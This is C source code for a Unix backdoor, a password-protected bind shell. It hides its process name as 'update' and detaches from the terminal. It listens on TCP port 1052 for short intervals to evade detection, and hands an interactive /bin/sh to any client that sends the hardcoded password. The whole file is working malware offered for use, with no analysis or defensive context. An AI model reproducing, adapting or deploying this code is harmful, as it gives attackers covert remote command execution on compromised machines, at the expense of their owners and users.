     1	/*                                             code by aion (aion@ukr.net) 
     2	 ****************************************************************************/
     3	
     4	#define PORT  	  1052
     5	#define PASS  	  "aion1981"   
     6	#define SLEEPTIME 300          // sleep  5 min.
     7	#define UPTIME    10           // listen 10 sec.
     8	#define PSNAME    "update   "  // what copy to argv[0]
     9	
    10	#include <stdio.h>
    11	#include <signal.h>        
    12	#include <string.h>        
    13	#include <sys/types.h>
    14	#include <sys/socket.h>
    15	#include <sys/wait.h>      
    16	#include <netinet/in.h> 
    17	#include <fcntl.h>	   
    18	#include <time.h>           
    19	
    20	time_t stimer; int retval;
    21	char temp_buff[11];
    22	int soc_des, soc_cli, soc_rc;
    23	struct sockaddr_in serv_addr; 
    24	struct sockaddr_in client_addr;
    25	
    26	closeall()
    27	{
    28	  close(soc_cli);      close(soc_des);       // port is still listen
    29	  shutdown(soc_cli,0); shutdown(soc_des,0);  // if don't close/shutdown all !
    30	}
    31	
    32	main (int argc,char **argv) 
    33	{ 
    34	    for(retval=0;argv[0][retval]!=0;retval++) argv[0][retval]=0; 
    35	    strcpy(argv[0],PSNAME);
    36	    setpgrp(); signal(SIGHUP, SIG_IGN); if (fork() != 0) exit(0); 
    37	
    38	    // this is needed to check if port already open (in loop we don't check it)
    39	    if( (soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) exit(-1); 
    40	    bzero((char *) &serv_addr, sizeof(serv_addr));
    41	    serv_addr.sin_family = AF_INET; 
    42	    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    43	    serv_addr.sin_port = htons(PORT);
    44	    if( (soc_rc = bind(soc_des, 
    45	        (struct sockaddr *) &serv_addr, sizeof(serv_addr))) != 0) exit(-1); 
    46	    if( (soc_rc=listen(soc_des, 5)) != 0) exit(0); 
    47	
    48	    while (1) { 
    49	        fcntl(soc_cli, F_SETFL, O_NONBLOCK); 
    50	        fcntl(soc_des, F_SETFL, O_NONBLOCK); 
    51	        
    52		for(stimer=time(NULL);(stimer+UPTIME)>time(NULL);)
    53		{
    54		  soc_cli = accept(soc_des, 
    55		              (struct sockaddr *) &client_addr, sizeof(client_addr));
    56	          if (soc_cli > 0) 
    57		  {
    58	            if (!fork()) { 
    59	                dup2(soc_cli,0); 
    60	                dup2(soc_cli,1); 
    61	                dup2(soc_cli,2);
    62	   	        read(soc_cli,temp_buff,10);
    63		        if( !strncmp(temp_buff,PASS,strlen(PASS)) )
    64	                  execl("/bin/sh","sh -i",(char *)0); 
    65	                closeall(); 
    66	                exit(0); 
    67	            } else wait(&retval); 
    68		  }
    69		  sleep(1);
    70		}                                   
    71	
    72	        closeall(); 
    73		sleep(SLEEPTIME);
    74	
    75		// bind port can change if don't call all this again
    76	        soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    77	        bzero((char *) &serv_addr, sizeof(serv_addr));
    78	        serv_addr.sin_family = AF_INET; 
    79	        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    80	        serv_addr.sin_port = htons(PORT);
    81	        soc_rc = bind(soc_des,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
    82	        soc_rc=listen(soc_des, 5);
    83	    }
    84	}
